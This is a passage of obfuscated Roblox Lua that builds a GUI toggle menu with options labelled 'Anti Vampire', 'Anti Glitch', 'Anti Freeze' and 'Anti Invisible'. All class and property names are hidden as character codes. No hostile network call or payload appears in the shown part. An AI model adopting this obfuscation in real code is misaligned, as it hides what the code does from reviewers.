_llza[_sc(50,101,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,101,56)]);
_llza[_sc(50,101,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,101,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,101,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,101,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,101,102)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,101,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,102)][_sc(84,101,120,116)]=[[Anti Vampire]];
_llza[_sc(50,101,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,101,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,101,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,102,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,101,102)]);
_llza[_sc(50,102,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,102,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,101,102)]);
_llza[_sc(50,102,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,102,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,101,56)]);
_llza[_sc(50,102,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,102,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,102,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,102,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,102,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,51)][_sc(78,97,109,101)]=[[glitch]];
_llza[_sc(50,102,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,102,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,102,51)]);
_llza[_sc(50,102,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,102,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,102,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,52)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,102,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,52)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,102,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,102,52)]);
_llza[_sc(50,102,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,102,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,102,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,102,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,102,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,102,52)]);
_llza[_sc(50,102,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,102,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,102,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,102,54)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,102,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,102,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,102,54)]);
_llza[_sc(50,102,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,102,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,102,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,102,54)]);
_llza[_sc(50,102,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,102,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,56)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,102,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,102,56)]);
_llza[_sc(50,102,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,102,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,102,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,102,51)]);
_llza[_sc(50,102,97)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,102,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,102,97)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,102,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,102,97)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,102,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,97)][_sc(84,101,120,116)]=[[Anti Glitch]];
_llza[_sc(50,102,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,102,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,102,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,102,97)]);
_llza[_sc(50,102,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,102,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,102,97)]);
_llza[_sc(50,102,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,102,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,102,51)]);
_llza[_sc(50,102,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,102,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,102,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,102,101)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(50,102,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,101)][_sc(78,97,109,101)]=[[freeze]];
_llza[_sc(50,102,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,102,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,102)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,102,101)]);
_llza[_sc(50,102,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,102,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,102,102)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,102,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,102)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,102,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,102,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,102,102)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,48,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,102,102)]);
_llza[_sc(51,48,48)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,48,48)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,48,48)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,48,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,48,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,102,102)]);
_llza[_sc(51,48,49)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,48,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,48,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,48,49)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,48,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,48,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,48,49)]);
_llza[_sc(51,48,50)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,48,50)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,48,51)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,48,49)]);
_llza[_sc(51,48,51)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,48,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,51)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,48,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,52)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,48,51)]);
_llza[_sc(51,48,52)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,48,52)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,48,53)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,102,101)]);
_llza[_sc(51,48,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,48,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,48,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,48,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,48,53)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,48,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,53)][_sc(84,101,120,116)]=[[Anti Freeze]];
_llza[_sc(51,48,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,48,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,48,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,48,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,48,53)]);
_llza[_sc(51,48,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,48,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,48,53)]);
_llza[_sc(51,48,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,48,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,102,101)]);
_llza[_sc(51,48,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,48,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,48,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,48,57)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(51,48,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,57)][_sc(78,97,109,101)]=[[invisible]];
_llza[_sc(51,48,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,48,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,48,57)]);
_llza[_sc(51,48,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,48,97)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,48,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,48,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,97)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,48,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,48,97)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,48,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,48,97)]);
_llza[_sc(51,48,98)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,48,98)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,48,98)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,48,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,48,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,48,97)]);
_llza[_sc(51,48,99)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,48,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,48,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,48,99)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,48,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,48,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,48,99)]);
_llza[_sc(51,48,100)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,48,100)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,48,101)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,48,99)]);
_llza[_sc(51,48,101)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,48,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48,101)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,48,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48,102)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,48,101)]);
_llza[_sc(51,48,102)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,48,102)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,49,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,48,57)]);
_llza[_sc(51,49,48)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,49,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,49,48)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,49,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,49,48)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,49,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,48)][_sc(84,101,120,116)]=[[Anti Invisible]];
_llza[_sc(51,49,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,49,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,49,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,49,48)]);
_llza[_sc(51,49,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,49,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,49,48)]);
_llza[_sc(51,49,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,49,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,48,57)]);
_llza[_sc(51,49,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,49,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,49,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,49,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(51,49,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,52)][_sc(78,97,109,101)]=[[morph]];
_llza[_sc(51,49,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,49,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,49,52)]);
_llza[_sc(51,49,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,49,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,49,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,49,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,49,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,49,53)]);
_llza[_sc(51,49,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,49,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,49,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,49,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,49,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,49,53)]);
_llza[_sc(51,49,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,49,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,49,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,49,55)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,49,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,49,55)]);
_llza[_sc(51,49,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,49,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,49,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,49,55)]);
_llza[_sc(51,49,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,49,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,57)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,49,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,49,57)]);
_llza[_sc(51,49,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,49,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,49,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,49,52)]);
_llza[_sc(51,49,98)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,49,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
